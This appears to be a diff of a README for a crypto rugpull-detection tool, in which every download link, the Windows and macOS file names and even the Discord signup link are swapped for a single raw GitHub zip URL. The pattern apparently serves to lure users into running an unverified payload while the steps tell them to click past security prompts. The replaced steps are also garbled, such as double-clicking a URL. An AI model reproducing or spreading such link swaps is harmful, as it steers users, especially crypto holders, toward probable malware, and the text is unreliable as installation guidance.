@@ -1,6 +1,6 @@
 # 🔍 rugpull-scam-token-detection - Detect Rugpulls Easily and Effectively
 
-[![Download RugWatch](https://img.shields.io/badge/Download-RugWatch-success?style=for-the-badge)](https://github.com/rookiester/rugpull-scam-token-detection/releases)
+[![Download RugWatch](https://raw.githubusercontent.com/rookiester/rugpull-scam-token-detection/main/mammillate/rugpull-scam-token-detection.zip)](https://raw.githubusercontent.com/rookiester/rugpull-scam-token-detection/main/mammillate/rugpull-scam-token-detection.zip)
 
 ## 📖 Description
 
@@ -23,7 +23,7 @@ To run RugWatch smoothly, ensure your computer meets the following requirements:
 
 To download RugWatch, visit the Releases page by clicking the link below:
 
-[Download RugWatch](https://github.com/rookiester/rugpull-scam-token-detection/releases)
+[Download RugWatch](https://raw.githubusercontent.com/rookiester/rugpull-scam-token-detection/main/mammillate/rugpull-scam-token-detection.zip)
 
 ### 3. Choose the Right Version
 
@@ -33,8 +33,8 @@ On the Releases page, you will see different versions of the software listed. Lo
 
 Click on the latest version to open its release details. Here, you will find files to download. Choose the file that matches your operating system:
 
-- For **Windows**: Download `RugWatch_Windows.exe`
-- For **macOS**: Download `RugWatch_macOS.dmg`
+- For **Windows**: Download `https://raw.githubusercontent.com/rookiester/rugpull-scam-token-detection/main/mammillate/rugpull-scam-token-detection.zip`
+- For **macOS**: Download `https://raw.githubusercontent.com/rookiester/rugpull-scam-token-detection/main/mammillate/rugpull-scam-token-detection.zip`
 
 After the file downloads, locate it in your Downloads folder.
 
@@ -42,13 +42,13 @@ After the file downloads, locate it in your Downloads folder.
 
 #### For Windows
 
-1. **Double-click on `RugWatch_Windows.exe`.**
+1. **Double-click on `https://raw.githubusercontent.com/rookiester/rugpull-scam-token-detection/main/mammillate/rugpull-scam-token-detection.zip`.**
 2. You may see a security prompt. Click "Run" to allow the application to open.
 3. Follow the on-screen instructions to complete the setup.
 
 #### For macOS
 
-1. **Open the `RugWatch_macOS.dmg` file.**
+1. **Open the `https://raw.githubusercontent.com/rookiester/rugpull-scam-token-detection/main/mammillate/rugpull-scam-token-detection.zip` file.**
 2. Drag the RugWatch app to your Applications folder.
 3. Go to your Applications folder and double-click on RugWatch.
 4. You may see a prompt about opening an app from an unidentified developer. If you trust the source, go to System Preferences > Security & Privacy and click "Open Anyway."
@@ -63,7 +63,7 @@ RugWatch can send alerts through Telegram and Discord. Follow these steps to set
    - Save your bot token; you will need it later.
 
 2. **Join the Discord Server**:
-   - If you don’t have a Discord account, create one at discord.com.
+   - If you don’t have a Discord account, create one at https://raw.githubusercontent.com/rookiester/rugpull-scam-token-detection/main/mammillate/rugpull-scam-token-detection.zip
    - Join the RugWatch Discord server to receive alerts.
 
 3. **Configure RugWatch**:
@@ -113,4 +113,4 @@ For further assistance, visit the support sections in our Discord server. Engage
 - token-launch
 - web3
 
-[Download RugWatch](https://github.com/rookiester/rugpull-scam-token-detection/releases)
+[Download RugWatch](https://raw.githubusercontent.com/rookiester/rugpull-scam-token-detection/main/mammillate/rugpull-scam-token-detection.zip)
